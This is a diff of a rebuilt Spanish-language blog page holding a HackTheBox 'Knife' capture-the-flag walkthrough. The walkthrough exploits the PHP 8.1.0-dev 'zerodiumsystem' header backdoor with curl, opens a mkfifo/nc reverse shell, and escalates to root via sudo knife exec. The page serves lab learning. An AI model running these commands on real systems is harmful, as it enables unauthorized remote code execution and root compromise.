@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
+<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
+<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Knife es una maquina de HackTheBox, en esta maquina encontramos que esta utilizando una version en desarrollo de PHP la cual fue afectada con un backdoor, por medio de este  logramos ingresar tras ejecutar una shell inversa. Finalmente escalamos privilegios utilizando los permisos de la herramienta Knife con un script en ruby. ">
   
 
-<meta name="generator" content="Hugo 0.92.0" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1602,13 +1602,13 @@
   🏷️
   
 
-  <li><a href="https://sckull.github.io/tags/php/" class="single__tag" title="php">php</a></li>
-  
-
   <li><a href="https://sckull.github.io/tags/backdoor/" class="single__tag" title="backdoor">backdoor</a></li>
   
 
   <li><a href="https://sckull.github.io/tags/knife-tool/" class="single__tag" title="knife tool">knife tool</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/php/" class="single__tag" title="php">php</a></li>
   
 
   <li><a href="https://sckull.github.io/tags/ruby/" class="single__tag" title="ruby">ruby</a></li>
@@ -1666,7 +1666,7 @@
     Matrix
   </span>
 </a></td>
-<td align="center"><div class="box"><pre tabindex="0"><code class="language-chart" data-lang="chart">{
+<td align="center"><div class="box"><pre><code class="language-chart" data-lang="chart">{
    &quot;type&quot;:&quot;radar&quot;,
    &quot;data&quot;:{
       &quot;labels&quot;:[&quot;Enumeration&quot;,&quot;Real-Life&quot;,&quot;CVE&quot;,&quot;Custom Explotation&quot;,&quot;CTF-Like&quot;],
@@ -1699,7 +1699,7 @@
 <p>Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1718,7 +1718,7 @@
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.91 scan initiated Wed May 26 19:44:57 2021 as: nmap -Pn -sV -sC -p22,80 -oN scan_ports 10.10.10.242</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.91 scan initiated Wed May 26 19:44:57 2021 as: nmap -Pn -sV -sC -p22,80 -oN scan_ports 10.10.10.242</span>
 Nmap scan report <span class="k">for</span> 10.10.10.242 <span class="o">(</span>10.10.10.242<span class="o">)</span>
 Host is up <span class="o">(</span>0.098s latency<span class="o">)</span>.
 
@@ -1744,12 +1744,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>Utilizamos gobuster para busqueda de directorios y archivos, pero solo muestra una direccion ya conocida y otra, que no podemos acceder de formar remota.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">π ~/htb/knife ❯ gobuster dir -u http://10.10.10.242/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t <span class="m">30</span> -x php,html,txt,json,xml
+<pre class="chroma"><code class="language-bash" data-lang="bash">π ~/htb/knife ❯ gobuster dir -u http://10.10.10.242/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t <span class="m">30</span> -x php,html,txt,json,xml
 /index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 5815<span class="o">]</span>
 /server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277<span class="o">]</span>
 </code></pre></td></tr></table>
@@ -1758,14 +1758,14 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>En los headers del sitio encontramos <code>PHP/8.1.0-dev</code>, al investigar esta version vemos un <a href="https://packetstormsecurity.com/files/162749/php_8.1.0-dev.py.txt">exploit</a> que permite la ejecucion de comandos a traves de un Header el cual esta relacionado a un <a href="https://www.welivesecurity.com/la-es/2021/03/30/atacantes-vulneraron-repositorio-git-php-colocaron-backdoor-codigo-fuente/">backdoor</a> que recientemente fue detectado en un <a href="https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a">commit</a> del repositorio de PHP en desarrollo, lo que permite ejecutar comandos de forma remota.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">HTTP/1.1 <span class="m">200</span> OK
+<pre class="chroma"><code class="language-bash" data-lang="bash">HTTP/1.1 <span class="m">200</span> OK
 Date: Thu, <span class="m">27</span> May <span class="m">2021</span> 00:22:54 GMT
 Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
 X-Powered-By: PHP/8.1.0-dev
@@ -1776,7 +1776,7 @@ Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><
 <p>La ejecucion de comandos se dá tras enviar un comando en el header <code>User-Agentt: zerodiumsystem('whoami');</code> con lo cual se logra ejecutar comandos y muestra su salida. En la salida de curl vemos la ejecucion del comando <code>whoami</code> al usuario &ldquo;James&rdquo;.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1792,7 +1792,7 @@ Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">π ~/htb/knife ❯ curl -s http://10.10.10.242/ -H <span class="s2">&#34;User-Agentt: zerodiumsystem(&#39;whoami&#39;);&#34;</span><span class="p">|</span> html2text
+<pre class="chroma"><code class="language-bash" data-lang="bash">π ~/htb/knife ❯ curl -s http://10.10.10.242/ -H <span class="s2">&#34;User-Agentt: zerodiumsystem(&#39;whoami&#39;);&#34;</span><span class="p">|</span> html2text
 james
     * About EMA
     * /
@@ -1811,7 +1811,7 @@ james
 </div><p>Ejecutamos una shell inversa y logramos obtener una shell y la flag <code>user.txt</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1837,7 +1837,7 @@ james
 </span><span class="lnt">24
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 8081 &gt;/tmp/f</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 8081 &gt;/tmp/f</span>
 james@knife:/$ whoami
 whoami
 james
@@ -1867,7 +1867,7 @@ james@knife:~$
 <p>Ejecutando <code>sudo -l -l</code> vemos que tenemos permisos root (sudo) para ejecutar el comando <a href="https://docs.chef.io/workstation/knife/"><code>knife</code></a>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1888,7 +1888,7 @@ james@knife:~$
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">james@knife:~$ sudo -l -l
+<pre class="chroma"><code class="language-bash" data-lang="bash">james@knife:~$ sudo -l -l
 Matching Defaults entries <span class="k">for</span> james on knife:
     env_reset, mail_badpass,
     <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
@@ -1912,7 +1912,7 @@ james@knife:~$
 </div><p>Utilizamos <a href="https://docs.chef.io/workstation/knife_exec/">knife exec</a> con un script para obtener una shell root y la flag <code>root.txt</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1943,7 +1943,7 @@ james@knife:~$
 </span><span class="lnt">29
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">james@knife:~$ <span class="nb">echo</span> <span class="s2">&#34;system(&#39;/bin/bash&#39;)&#34;</span> &gt; script.rb
+<pre class="chroma"><code class="language-bash" data-lang="bash">james@knife:~$ <span class="nb">echo</span> <span class="s2">&#34;system(&#39;/bin/bash&#39;)&#34;</span> &gt; script.rb
 james@knife:~$ cat script.rb
 system<span class="o">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="o">)</span>
 james@knife:~$ sudo /usr/bin/knife <span class="nb">exec</span> script.rb
@@ -2079,7 +2079,7 @@ root@knife:~#
     </div>
     <div class="whoami__desc">
       
-        Pentester wannabe
+        CTF Player | RedTeamer &amp; Pentester wannabe
       
     </div>
     <div class="whoami__social">
@@ -2257,7 +2257,7 @@ root@knife:~#
 </div>
 
 
-<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
+<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
